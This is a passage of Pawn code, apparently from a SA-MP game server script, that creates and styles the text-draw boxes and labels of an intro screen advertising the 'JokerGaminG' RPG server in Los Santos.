	IntroText3[13] = TextDrawCreate(225,-48,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[13],0.550000,3.099999); TextDrawAlignment(IntroText3[13],0); TextDrawBackgroundColor(IntroText3[13],0x000000FF); TextDrawFont(IntroText3[13],3); TextDrawUseBox(IntroText3[13],1); TextDrawBoxColor(IntroText3[13],0x000000FF); TextDrawTextSize(IntroText3[13],277.000000,-38.000000); TextDrawSetOutline(IntroText3[13],0); TextDrawSetProportional(IntroText3[13],1); TextDrawSetShadow(IntroText3[13],1);
	IntroText3[14] = TextDrawCreate(166,291,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[14],0.550000,3.099999); TextDrawAlignment(IntroText3[14],0); TextDrawBackgroundColor(IntroText3[14],0x000000FF); TextDrawFont(IntroText3[14],3); TextDrawUseBox(IntroText3[14],1); TextDrawBoxColor(IntroText3[14],0x000000FF); TextDrawTextSize(IntroText3[14],222.000000,301.000000); TextDrawSetOutline(IntroText3[14],0); TextDrawSetProportional(IntroText3[14],1); TextDrawSetShadow(IntroText3[14],1);
	IntroText3[15] = TextDrawCreate(167,240,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[15],0.449999,3.099999); TextDrawAlignment(IntroText3[15],0); TextDrawBackgroundColor(IntroText3[15],0x000000FF); TextDrawFont(IntroText3[15],3); TextDrawUseBox(IntroText3[15],1); TextDrawBoxColor(IntroText3[15],0x000000FF); TextDrawTextSize(IntroText3[15],167.000000,250.000000); TextDrawSetOutline(IntroText3[15],0); TextDrawSetProportional(IntroText3[15],1); TextDrawSetShadow(IntroText3[15],1);
	IntroText3[16] = TextDrawCreate(-154,131,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[16],0.550000,2.899999); TextDrawAlignment(IntroText3[16],0); TextDrawBackgroundColor(IntroText3[16],0x000000FF); TextDrawFont(IntroText3[16],3); TextDrawUseBox(IntroText3[16],1); TextDrawBoxColor(IntroText3[16],0x000000FF); TextDrawTextSize(IntroText3[16],164.000000,141.000000); TextDrawSetOutline(IntroText3[16],0); TextDrawSetProportional(IntroText3[16],1); TextDrawSetShadow(IntroText3[16],1);
	IntroText3[17] = TextDrawCreate(385,124,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[17],0.550000,2.899999); TextDrawAlignment(IntroText3[17],0); TextDrawBackgroundColor(IntroText3[17],0x000000FF); TextDrawFont(IntroText3[17],3); TextDrawUseBox(IntroText3[17],1); TextDrawBoxColor(IntroText3[17],0x000000FF); TextDrawTextSize(IntroText3[17],703.000000,134.000000); TextDrawSetOutline(IntroText3[17],0); TextDrawSetProportional(IntroText3[17],1); TextDrawSetShadow(IntroText3[17],1);
	IntroText3[18] = TextDrawCreate(-8,310,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[18],0.650000,2.699999); TextDrawAlignment(IntroText3[18],0); TextDrawBackgroundColor(IntroText3[18],0x000000FF); TextDrawFont(IntroText3[18],3); TextDrawUseBox(IntroText3[18],1); TextDrawBoxColor(IntroText3[18],0x000000FF); TextDrawTextSize(IntroText3[18],640.000000,320.000000); TextDrawSetOutline(IntroText3[18],0); TextDrawSetProportional(IntroText3[18],1); TextDrawSetShadow(IntroText3[18],1);
	IntroText3[19] = TextDrawCreate(-6,-42,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[19],0.650000,2.699999); TextDrawAlignment(IntroText3[19],0); TextDrawBackgroundColor(IntroText3[19],0x000000FF); TextDrawFont(IntroText3[19],3); TextDrawUseBox(IntroText3[19],1); TextDrawBoxColor(IntroText3[19],0x000000FF); TextDrawTextSize(IntroText3[19],642.000000,-32.000000); TextDrawSetOutline(IntroText3[19],0); TextDrawSetProportional(IntroText3[19],1); TextDrawSetShadow(IntroText3[19],1);
	IntroText3[20] = TextDrawCreate(395,125,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[20],0.449999,3.099999); TextDrawAlignment(IntroText3[20],0); TextDrawBackgroundColor(IntroText3[20],0x000000FF); TextDrawFont(IntroText3[20],3); TextDrawUseBox(IntroText3[20],1); TextDrawBoxColor(IntroText3[20],0x000000FF); TextDrawTextSize(IntroText3[20],395.000000,135.000000); TextDrawSetOutline(IntroText3[20],0); TextDrawSetProportional(IntroText3[20],1); TextDrawSetShadow(IntroText3[20],1);
	IntroText3[21] = TextDrawCreate(336,334,"~l~/"); TextDrawLetterSize(IntroText3[21],0.800000,-13.000013); TextDrawAlignment(IntroText3[21],0); TextDrawBackgroundColor(IntroText3[21],0x000000FF); TextDrawFont(IntroText3[21],3); TextDrawUseBox(IntroText3[21],0); TextDrawSetOutline(IntroText3[21],0); TextDrawSetProportional(IntroText3[21],1); TextDrawSetShadow(IntroText3[21],0);
	IntroText3[22] = TextDrawCreate(330,243,"~l~/"); TextDrawLetterSize(IntroText3[22],0.800000,-13.000013); TextDrawAlignment(IntroText3[22],0); TextDrawBackgroundColor(IntroText3[22],0x000000FF); TextDrawFont(IntroText3[22],3); TextDrawUseBox(IntroText3[22],0); TextDrawSetOutline(IntroText3[22],0); TextDrawSetProportional(IntroText3[22],1); TextDrawSetShadow(IntroText3[22],0);
	IntroText3[23] = TextDrawCreate(280,339,"~l~/"); TextDrawLetterSize(IntroText3[23],0.800000,-13.000013); TextDrawAlignment(IntroText3[23],0); TextDrawBackgroundColor(IntroText3[23],0x000000FF); TextDrawFont(IntroText3[23],3); TextDrawUseBox(IntroText3[23],0); TextDrawSetOutline(IntroText3[23],0); TextDrawSetProportional(IntroText3[23],1); TextDrawSetShadow(IntroText3[23],0);
	IntroText3[24] = TextDrawCreate(274,245,"~l~/"); TextDrawLetterSize(IntroText3[24],0.800000,-13.000013); TextDrawAlignment(IntroText3[24],0); TextDrawBackgroundColor(IntroText3[24],0x000000FF); TextDrawFont(IntroText3[24],3); TextDrawUseBox(IntroText3[24],0); TextDrawSetOutline(IntroText3[24],0); TextDrawSetProportional(IntroText3[24],1); TextDrawSetShadow(IntroText3[24],0);
	IntroText3[25] = TextDrawCreate(224,127,"_~n~_~n~_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText3[25],0.449999,3.099999); TextDrawAlignment(IntroText3[25],0); TextDrawBackgroundColor(IntroText3[25],0x000000FF); TextDrawFont(IntroText3[25],3); TextDrawUseBox(IntroText3[25],1); TextDrawBoxColor(IntroText3[25],0x000000FF); TextDrawTextSize(IntroText3[25],224.000000,137.000000); TextDrawSetOutline(IntroText3[25],0); TextDrawSetProportional(IntroText3[25],1); TextDrawSetShadow(IntroText3[25],1);
	IntroText3[26] = TextDrawCreate(161,357,"~l~/"); TextDrawLetterSize(IntroText3[26],0.800000,-25.100059); TextDrawAlignment(IntroText3[26],0); TextDrawBackgroundColor(IntroText3[26],0x000000FF); TextDrawFont(IntroText3[26],3); TextDrawUseBox(IntroText3[26],0); TextDrawSetOutline(IntroText3[26],0); TextDrawSetProportional(IntroText3[26],1); TextDrawSetShadow(IntroText3[26],0);
	IntroText3[27] = TextDrawCreate(386,177,"~y~Sherkat:"); TextDrawLetterSize(IntroText3[27],0.850000,3.099999); TextDrawAlignment(IntroText3[27],0); TextDrawBackgroundColor(IntroText3[27],0x000000FF); TextDrawFont(IntroText3[27],0); TextDrawUseBox(IntroText3[27],0); TextDrawSetOutline(IntroText3[27],0); TextDrawSetProportional(IntroText3[27],1); TextDrawSetShadow(IntroText3[27],0);
	IntroText3[28] = TextDrawCreate(291,254,"~y~WebSaite:"); TextDrawLetterSize(IntroText3[28],0.850000,3.099999); TextDrawAlignment(IntroText3[28],0); TextDrawBackgroundColor(IntroText3[28],0x000000FF); TextDrawFont(IntroText3[28],0); TextDrawUseBox(IntroText3[28],0); TextDrawSetOutline(IntroText3[28],0); TextDrawSetProportional(IntroText3[28],1); TextDrawSetShadow(IntroText3[28],0);
	IntroText3[29] = TextDrawCreate(387,205," JokerGaminG"); TextDrawLetterSize(IntroText3[29],0.500000,2.399999); TextDrawAlignment(IntroText3[29],0); TextDrawBackgroundColor(IntroText3[29],0x658379FF); TextDrawFont(IntroText3[29],1); TextDrawUseBox(IntroText3[29],0); TextDrawSetOutline(IntroText3[29],0); TextDrawSetProportional(IntroText3[29],1); TextDrawSetShadow(IntroText3[29],0);
	IntroText3[30] = TextDrawCreate(292,280,"Forum.JokerGaminG.ir"); TextDrawLetterSize(IntroText3[30],0.500000,2.399999); TextDrawAlignment(IntroText3[30],0); TextDrawBackgroundColor(IntroText3[30],0x658379FF); TextDrawFont(IntroText3[30],1); TextDrawUseBox(IntroText3[30],0); TextDrawSetOutline(IntroText3[30],0); TextDrawSetProportional(IntroText3[30],1); TextDrawSetShadow(IntroText3[30],0);
	IntroText4[0] = TextDrawCreate(167,139,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[0],0.449999,2.699999); TextDrawAlignment(IntroText4[0],0); TextDrawBackgroundColor(IntroText4[0],0x000000FF); TextDrawFont(IntroText4[0],3); TextDrawUseBox(IntroText4[0],1); TextDrawBoxColor(IntroText4[0],0x000000FF); TextDrawTextSize(IntroText4[0],267.000000,149.000000); TextDrawSetOutline(IntroText4[0],0); TextDrawSetProportional(IntroText4[0],1); TextDrawSetShadow(IntroText4[0],1);
	IntroText4[1] = TextDrawCreate(408,90,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[1],0.449999,4.699997); TextDrawAlignment(IntroText4[1],0); TextDrawBackgroundColor(IntroText4[1],0x000000FF); TextDrawFont(IntroText4[1],3); TextDrawUseBox(IntroText4[1],1); TextDrawBoxColor(IntroText4[1],0x000000FF); TextDrawTextSize(IntroText4[1],508.000000,100.000000); TextDrawSetOutline(IntroText4[1],0); TextDrawSetProportional(IntroText4[1],1); TextDrawSetShadow(IntroText4[1],1);
	IntroText4[2] = TextDrawCreate(241,100,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[2],0.449999,4.699997); TextDrawAlignment(IntroText4[2],0); TextDrawBackgroundColor(IntroText4[2],0x000000FF); TextDrawFont(IntroText4[2],3); TextDrawUseBox(IntroText4[2],1); TextDrawBoxColor(IntroText4[2],0x000000FF); TextDrawTextSize(IntroText4[2],341.000000,110.000000); TextDrawSetOutline(IntroText4[2],0); TextDrawSetProportional(IntroText4[2],1); TextDrawSetShadow(IntroText4[2],1);
	IntroText4[3] = TextDrawCreate(326,110,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[3],0.449999,4.699997); TextDrawAlignment(IntroText4[3],0); TextDrawBackgroundColor(IntroText4[3],0x000000FF); TextDrawFont(IntroText4[3],3); TextDrawUseBox(IntroText4[3],1); TextDrawBoxColor(IntroText4[3],0x000000FF); TextDrawTextSize(IntroText4[3],426.000000,120.000000); TextDrawSetOutline(IntroText4[3],0); TextDrawSetProportional(IntroText4[3],1); TextDrawSetShadow(IntroText4[3],1);
	IntroText4[4] = TextDrawCreate(471,125,"~l~/"); TextDrawLetterSize(IntroText4[4],0.750000,12.600011); TextDrawAlignment(IntroText4[4],0); TextDrawBackgroundColor(IntroText4[4],0x000000FF); TextDrawFont(IntroText4[4],1); TextDrawUseBox(IntroText4[4],0); TextDrawSetOutline(IntroText4[4],0); TextDrawSetProportional(IntroText4[4],1); TextDrawSetShadow(IntroText4[4],0);
	IntroText4[5] = TextDrawCreate(465,214,"~l~/"); TextDrawLetterSize(IntroText4[5],0.750000,12.600011); TextDrawAlignment(IntroText4[5],0); TextDrawBackgroundColor(IntroText4[5],0x000000FF); TextDrawFont(IntroText4[5],1); TextDrawUseBox(IntroText4[5],0); TextDrawSetOutline(IntroText4[5],0); TextDrawSetProportional(IntroText4[5],1); TextDrawSetShadow(IntroText4[5],0);
	IntroText4[6] = TextDrawCreate(-13,-1,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[6],0.500000,2.699999); TextDrawAlignment(IntroText4[6],0); TextDrawBackgroundColor(IntroText4[6],0x000000FF); TextDrawFont(IntroText4[6],3); TextDrawUseBox(IntroText4[6],1); TextDrawBoxColor(IntroText4[6],0x000000FF); TextDrawTextSize(IntroText4[6],649.000000,9.000000); TextDrawSetOutline(IntroText4[6],0); TextDrawSetProportional(IntroText4[6],1); TextDrawSetShadow(IntroText4[6],1);
	IntroText4[7] = TextDrawCreate(-8,314,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[7],0.500000,3.499998); TextDrawAlignment(IntroText4[7],0); TextDrawBackgroundColor(IntroText4[7],0x000000FF); TextDrawFont(IntroText4[7],3); TextDrawUseBox(IntroText4[7],1); TextDrawBoxColor(IntroText4[7],0x000000FF); TextDrawTextSize(IntroText4[7],654.000000,324.000000); TextDrawSetOutline(IntroText4[7],0); TextDrawSetProportional(IntroText4[7],1); TextDrawSetShadow(IntroText4[7],1);
	IntroText4[8] = TextDrawCreate(254,238,"~l~/"); TextDrawLetterSize(IntroText4[8],0.750000,11.700008); TextDrawAlignment(IntroText4[8],0); TextDrawBackgroundColor(IntroText4[8],0x000000FF); TextDrawFont(IntroText4[8],1); TextDrawUseBox(IntroText4[8],0); TextDrawSetOutline(IntroText4[8],0); TextDrawSetProportional(IntroText4[8],1); TextDrawSetShadow(IntroText4[8],0);
	IntroText4[9] = TextDrawCreate(-141,108,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[9],0.500000,4.499998); TextDrawAlignment(IntroText4[9],0); TextDrawBackgroundColor(IntroText4[9],0x000000FF); TextDrawFont(IntroText4[9],3); TextDrawUseBox(IntroText4[9],1); TextDrawBoxColor(IntroText4[9],0x000000FF); TextDrawTextSize(IntroText4[9],195.000000,118.000000); TextDrawSetOutline(IntroText4[9],0); TextDrawSetProportional(IntroText4[9],1); TextDrawSetShadow(IntroText4[9],1);
	IntroText4[10] = TextDrawCreate(479,118,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[10],0.500000,4.499998); TextDrawAlignment(IntroText4[10],0); TextDrawBackgroundColor(IntroText4[10],0x000000FF); TextDrawFont(IntroText4[10],3); TextDrawUseBox(IntroText4[10],1); TextDrawBoxColor(IntroText4[10],0x000000FF); TextDrawTextSize(IntroText4[10],815.000000,128.000000); TextDrawSetOutline(IntroText4[10],0); TextDrawSetProportional(IntroText4[10],1); TextDrawSetShadow(IntroText4[10],1);
	IntroText4[11] = TextDrawCreate(477,224,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[11],0.500000,4.499998); TextDrawAlignment(IntroText4[11],0); TextDrawBackgroundColor(IntroText4[11],0x000000FF); TextDrawFont(IntroText4[11],3); TextDrawUseBox(IntroText4[11],1); TextDrawBoxColor(IntroText4[11],0x000000FF); TextDrawTextSize(IntroText4[11],813.000000,234.000000); TextDrawSetOutline(IntroText4[11],0); TextDrawSetProportional(IntroText4[11],1); TextDrawSetShadow(IntroText4[11],1);
	IntroText4[12] = TextDrawCreate(473,255,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[12],0.500000,4.499998); TextDrawAlignment(IntroText4[12],0); TextDrawBackgroundColor(IntroText4[12],0x000000FF); TextDrawFont(IntroText4[12],3); TextDrawUseBox(IntroText4[12],1); TextDrawBoxColor(IntroText4[12],0x000000FF); TextDrawTextSize(IntroText4[12],809.000000,265.000000); TextDrawSetOutline(IntroText4[12],0); TextDrawSetProportional(IntroText4[12],1); TextDrawSetShadow(IntroText4[12],1);
	IntroText4[13] = TextDrawCreate(170,257,"~l~/"); TextDrawLetterSize(IntroText4[13],6.550006,-1.100000); TextDrawAlignment(IntroText4[13],0); TextDrawBackgroundColor(IntroText4[13],0x000000FF); TextDrawFont(IntroText4[13],3); TextDrawUseBox(IntroText4[13],0); TextDrawSetOutline(IntroText4[13],0); TextDrawSetProportional(IntroText4[13],1); TextDrawSetShadow(IntroText4[13],0);
	IntroText4[14] = TextDrawCreate(143,257,"~l~/"); TextDrawLetterSize(IntroText4[14],6.550006,-1.100000); TextDrawAlignment(IntroText4[14],0); TextDrawBackgroundColor(IntroText4[14],0x000000FF); TextDrawFont(IntroText4[14],3); TextDrawUseBox(IntroText4[14],0); TextDrawSetOutline(IntroText4[14],0); TextDrawSetProportional(IntroText4[14],1); TextDrawSetShadow(IntroText4[14],0);
	IntroText4[15] = TextDrawCreate(368,296,"~l~/"); TextDrawLetterSize(IntroText4[15],7.450010,-1.100000); TextDrawAlignment(IntroText4[15],0); TextDrawBackgroundColor(IntroText4[15],0x000000FF); TextDrawFont(IntroText4[15],3); TextDrawUseBox(IntroText4[15],0); TextDrawSetOutline(IntroText4[15],0); TextDrawSetProportional(IntroText4[15],1); TextDrawSetShadow(IntroText4[15],0);
	IntroText4[16] = TextDrawCreate(358,299,"~l~/"); TextDrawLetterSize(IntroText4[16],7.450010,-1.100000); TextDrawAlignment(IntroText4[16],0); TextDrawBackgroundColor(IntroText4[16],0x000000FF); TextDrawFont(IntroText4[16],3); TextDrawUseBox(IntroText4[16],0); TextDrawSetOutline(IntroText4[16],0); TextDrawSetProportional(IntroText4[16],1); TextDrawSetShadow(IntroText4[16],0);
	IntroText4[17] = TextDrawCreate(232,121,"~l~/"); TextDrawLetterSize(IntroText4[17],8.200013,1.000000); TextDrawAlignment(IntroText4[17],0); TextDrawBackgroundColor(IntroText4[17],0x000000FF); TextDrawFont(IntroText4[17],3); TextDrawUseBox(IntroText4[17],0); TextDrawSetOutline(IntroText4[17],0); TextDrawSetProportional(IntroText4[17],1); TextDrawSetShadow(IntroText4[17],0);
	IntroText4[18] = TextDrawCreate(220,118,"~l~/"); TextDrawLetterSize(IntroText4[18],8.200013,1.000000); TextDrawAlignment(IntroText4[18],0); TextDrawBackgroundColor(IntroText4[18],0x000000FF); TextDrawFont(IntroText4[18],3); TextDrawUseBox(IntroText4[18],0); TextDrawSetOutline(IntroText4[18],0); TextDrawSetProportional(IntroText4[18],1); TextDrawSetShadow(IntroText4[18],0);
	IntroText4[19] = TextDrawCreate(169,123,"_"); TextDrawLetterSize(IntroText4[19],0.500000,2.000000); TextDrawAlignment(IntroText4[19],0); TextDrawBackgroundColor(IntroText4[19],0x000000FF); TextDrawFont(IntroText4[19],3); TextDrawUseBox(IntroText4[19],1); TextDrawBoxColor(IntroText4[19],0x000000FF); TextDrawTextSize(IntroText4[19],269.000000,133.000000); TextDrawSetOutline(IntroText4[19],0); TextDrawSetProportional(IntroText4[19],1); TextDrawSetShadow(IntroText4[19],1);
	IntroText4[20] = TextDrawCreate(403,295,"_"); TextDrawLetterSize(IntroText4[20],0.500000,2.000000); TextDrawAlignment(IntroText4[20],0); TextDrawBackgroundColor(IntroText4[20],0x000000FF); TextDrawFont(IntroText4[20],3); TextDrawUseBox(IntroText4[20],1); TextDrawBoxColor(IntroText4[20],0x000000FF); TextDrawTextSize(IntroText4[20],503.000000,305.000000); TextDrawSetOutline(IntroText4[20],0); TextDrawSetProportional(IntroText4[20],1); TextDrawSetShadow(IntroText4[20],1);
	IntroText4[21] = TextDrawCreate(346,120,"_"); TextDrawLetterSize(IntroText4[21],0.500000,2.000000); TextDrawAlignment(IntroText4[21],0); TextDrawBackgroundColor(IntroText4[21],0x000000FF); TextDrawFont(IntroText4[21],3); TextDrawUseBox(IntroText4[21],1); TextDrawBoxColor(IntroText4[21],0x000000FF); TextDrawTextSize(IntroText4[21],415.000000,130.000000); TextDrawSetOutline(IntroText4[21],0); TextDrawSetProportional(IntroText4[21],1); TextDrawSetShadow(IntroText4[21],1);
	IntroText4[22] = TextDrawCreate(335,269,"_"); TextDrawLetterSize(IntroText4[22],0.500000,4.599997); TextDrawAlignment(IntroText4[22],0); TextDrawBackgroundColor(IntroText4[22],0x000000FF); TextDrawFont(IntroText4[22],3); TextDrawUseBox(IntroText4[22],1); TextDrawBoxColor(IntroText4[22],0x000000FF); TextDrawTextSize(IntroText4[22],402.000000,279.000000); TextDrawSetOutline(IntroText4[22],0); TextDrawSetProportional(IntroText4[22],1); TextDrawSetShadow(IntroText4[22],1);
	IntroText4[23] = TextDrawCreate(192,256,"_"); TextDrawLetterSize(IntroText4[23],0.500000,6.299996); TextDrawAlignment(IntroText4[23],0); TextDrawBackgroundColor(IntroText4[23],0x000000FF); TextDrawFont(IntroText4[23],3); TextDrawUseBox(IntroText4[23],1); TextDrawBoxColor(IntroText4[23],0x000000FF); TextDrawTextSize(IntroText4[23],259.000000,266.000000); TextDrawSetOutline(IntroText4[23],0); TextDrawSetProportional(IntroText4[23],1); TextDrawSetShadow(IntroText4[23],1);
	IntroText4[24] = TextDrawCreate(404,133,"~l~/"); TextDrawLetterSize(IntroText4[24],7.650011,-1.100000); TextDrawAlignment(IntroText4[24],0); TextDrawBackgroundColor(IntroText4[24],0x000000FF); TextDrawFont(IntroText4[24],3); TextDrawUseBox(IntroText4[24],0); TextDrawSetOutline(IntroText4[24],0); TextDrawSetProportional(IntroText4[24],1); TextDrawSetShadow(IntroText4[24],0);
	IntroText4[25] = TextDrawCreate(412,130,"~l~/"); TextDrawLetterSize(IntroText4[25],7.650011,-1.100000); TextDrawAlignment(IntroText4[25],0); TextDrawBackgroundColor(IntroText4[25],0x000000FF); TextDrawFont(IntroText4[25],3); TextDrawUseBox(IntroText4[25],0); TextDrawSetOutline(IntroText4[25],0); TextDrawSetProportional(IntroText4[25],1); TextDrawSetShadow(IntroText4[25],0);
	IntroText4[26] = TextDrawCreate(337,91,"~l~/");TextDrawLetterSize(IntroText4[26],0.750000,11.700008); TextDrawAlignment(IntroText4[26],0); TextDrawBackgroundColor(IntroText4[26],0x000000FF); TextDrawFont(IntroText4[26],1); TextDrawUseBox(IntroText4[26],0); TextDrawSetOutline(IntroText4[26],0); TextDrawSetProportional(IntroText4[26],1); TextDrawSetShadow(IntroText4[26],0);
	IntroText4[27] = TextDrawCreate(258,181,"~l~/"); TextDrawLetterSize(IntroText4[27],0.750000,11.700008); TextDrawAlignment(IntroText4[27],0); TextDrawBackgroundColor(IntroText4[27],0x000000FF); TextDrawFont(IntroText4[27],1); TextDrawUseBox(IntroText4[27],0); TextDrawSetOutline(IntroText4[27],0); TextDrawSetProportional(IntroText4[27],1); TextDrawSetShadow(IntroText4[27],0);
	IntroText4[28] = TextDrawCreate(264,95,"~l~/"); TextDrawLetterSize(IntroText4[28],0.750000,11.700008); TextDrawAlignment(IntroText4[28],0); TextDrawBackgroundColor(IntroText4[28],0x000000FF); TextDrawFont(IntroText4[28],1); TextDrawUseBox(IntroText4[28],0); TextDrawSetOutline(IntroText4[28],0); TextDrawSetProportional(IntroText4[28],1); TextDrawSetShadow(IntroText4[28],0);
	IntroText4[29] = TextDrawCreate(199,113,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText4[29],0.449999,4.899997); TextDrawAlignment(IntroText4[29],0); TextDrawBackgroundColor(IntroText4[29],0x000000FF); TextDrawFont(IntroText4[29],3); TextDrawUseBox(IntroText4[29],1); TextDrawBoxColor(IntroText4[29],0x000000FF); TextDrawTextSize(IntroText4[29],199.000000,123.000000); TextDrawSetOutline(IntroText4[29],0); TextDrawSetProportional(IntroText4[29],1); TextDrawSetShadow(IntroText4[29],1);
	IntroText4[30] = TextDrawCreate(331,170,"~l~/"); TextDrawLetterSize(IntroText4[30],0.750000,11.700008); TextDrawAlignment(IntroText4[30],0); TextDrawBackgroundColor(IntroText4[30],0x000000FF); TextDrawFont(IntroText4[30],1); TextDrawUseBox(IntroText4[30],0); TextDrawSetOutline(IntroText4[30],0); TextDrawSetProportional(IntroText4[30],1); TextDrawSetShadow(IntroText4[30],0);
	IntroText4[31] = TextDrawCreate(325,253,"~l~/"); TextDrawLetterSize(IntroText4[31],0.750000,11.700008); TextDrawAlignment(IntroText4[31],0); TextDrawBackgroundColor(IntroText4[31],0x000000FF); TextDrawFont(IntroText4[31],1); TextDrawUseBox(IntroText4[31],0); TextDrawSetOutline(IntroText4[31],0); TextDrawSetProportional(IntroText4[31],1); TextDrawSetShadow(IntroText4[31],0);
	IntroText4[32] = TextDrawCreate(406,110,"~l~/"); TextDrawLetterSize(IntroText4[32],0.750000,11.700008); TextDrawAlignment(IntroText4[32],0); TextDrawBackgroundColor(IntroText4[32],0x000000FF); TextDrawFont(IntroText4[32],1); TextDrawUseBox(IntroText4[32],0); TextDrawSetOutline(IntroText4[32],0); TextDrawSetProportional(IntroText4[32],1); TextDrawSetShadow(IntroText4[32],0);
	IntroText4[33] = TextDrawCreate(400,197,"~l~/"); TextDrawLetterSize(IntroText4[33],0.750000,11.700008); TextDrawAlignment(IntroText4[33],0); TextDrawBackgroundColor(IntroText4[33],0x000000FF); TextDrawFont(IntroText4[33],1); TextDrawUseBox(IntroText4[33],0); TextDrawSetOutline(IntroText4[33],0); TextDrawSetProportional(IntroText4[33],1); TextDrawSetShadow(IntroText4[33],0);
	IntroText4[34] = TextDrawCreate(346,44,"~y~System:"); TextDrawLetterSize(IntroText4[34],0.850000,3.099999); TextDrawAlignment(IntroText4[34],0); TextDrawBackgroundColor(IntroText4[34],0x000000FF); TextDrawFont(IntroText4[34],0); TextDrawUseBox(IntroText4[34],0); TextDrawSetOutline(IntroText4[34],0); TextDrawSetProportional(IntroText4[34],1); TextDrawSetShadow(IntroText4[34],0);
	IntroText4[35] = TextDrawCreate(348,72,"RPG Server~n~"); TextDrawLetterSize(IntroText4[35],0.500000,2.399999); TextDrawAlignment(IntroText4[35],1); TextDrawBackgroundColor(IntroText4[35],0x658379FF); TextDrawFont(IntroText4[35],1); TextDrawUseBox(IntroText4[35],0); TextDrawSetOutline(IntroText4[35],0); TextDrawSetProportional(IntroText4[35],1); TextDrawSetShadow(IntroText4[35],0);
	IntroText4[36] = TextDrawCreate(203,251,"~y~City:"); TextDrawLetterSize(IntroText4[36],0.850000,3.099999); TextDrawAlignment(IntroText4[36],0); TextDrawBackgroundColor(IntroText4[36],0x000000FF); TextDrawFont(IntroText4[36],0); TextDrawUseBox(IntroText4[36],0); TextDrawSetOutline(IntroText4[36],0); TextDrawSetProportional(IntroText4[36],1); TextDrawSetShadow(IntroText4[36],0);
	IntroText4[37] = TextDrawCreate(245,280,"Los Santos"); TextDrawLetterSize(IntroText4[37],0.500000,2.399999); TextDrawAlignment(IntroText4[37],3); TextDrawBackgroundColor(IntroText4[37],0x658379FF); TextDrawFont(IntroText4[37],1); TextDrawUseBox(IntroText4[37],0); TextDrawSetOutline(IntroText4[37],0); TextDrawSetProportional(IntroText4[37],1); TextDrawSetShadow(IntroText4[37],0);
	IntroText5[0] = TextDrawCreate(414,118,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[0],0.399999,5.099997); TextDrawAlignment(IntroText5[0],0); TextDrawBackgroundColor(IntroText5[0],0x000000FF); TextDrawFont(IntroText5[0],3); TextDrawUseBox(IntroText5[0],1); TextDrawBoxColor(IntroText5[0],0x000000FF); TextDrawTextSize(IntroText5[0],482.000000,128.000000); TextDrawSetOutline(IntroText5[0],0); TextDrawSetProportional(IntroText5[0],1); TextDrawSetShadow(IntroText5[0],1);
	IntroText5[1] = TextDrawCreate(281,122,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[1],0.399999,5.099997); TextDrawAlignment(IntroText5[1],0); TextDrawBackgroundColor(IntroText5[1],0x000000FF); TextDrawFont(IntroText5[1],3); TextDrawUseBox(IntroText5[1],1); TextDrawBoxColor(IntroText5[1],0x000000FF); TextDrawTextSize(IntroText5[1],354.000000,132.000000); TextDrawSetOutline(IntroText5[1],0); TextDrawSetProportional(IntroText5[1],1); TextDrawSetShadow(IntroText5[1],1);
	IntroText5[2] = TextDrawCreate(323,92,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[2],0.399999,5.499997); TextDrawAlignment(IntroText5[2],0); TextDrawBackgroundColor(IntroText5[2],0x000000FF); TextDrawFont(IntroText5[2],3); TextDrawUseBox(IntroText5[2],1); TextDrawBoxColor(IntroText5[2],0x000000FF); TextDrawTextSize(IntroText5[2],413.000000,102.000000); TextDrawSetOutline(IntroText5[2],0); TextDrawSetProportional(IntroText5[2],1); TextDrawSetShadow(IntroText5[2],1);
	IntroText5[3] = TextDrawCreate(218,98,"_~n~_~n~_~n~_~n~_~n~"); TextDrawLetterSize(IntroText5[3],0.399999,5.499997); TextDrawAlignment(IntroText5[3],0); TextDrawBackgroundColor(IntroText5[3],0x000000FF); TextDrawFont(IntroText5[3],3); TextDrawUseBox(IntroText5[3],1); TextDrawBoxColor(IntroText5[3],0x000000FF); TextDrawTextSize(IntroText5[3],308.000000,108.000000); TextDrawSetOutline(IntroText5[3],0); TextDrawSetProportional(IntroText5[3],1); TextDrawSetShadow(IntroText5[3],1);
	IntroText5[4] = TextDrawCreate(288,339,"~l~/"); TextDrawLetterSize(IntroText5[4],8.350013,-1.700000); TextDrawAlignment(IntroText5[4],0); TextDrawBackgroundColor(IntroText5[4],0x000000FF); TextDrawFont(IntroText5[4],3); TextDrawUseBox(IntroText5[4],0); TextDrawSetOutline(IntroText5[4],0); TextDrawSetProportional(IntroText5[4],1); TextDrawSetShadow(IntroText5[4],0);
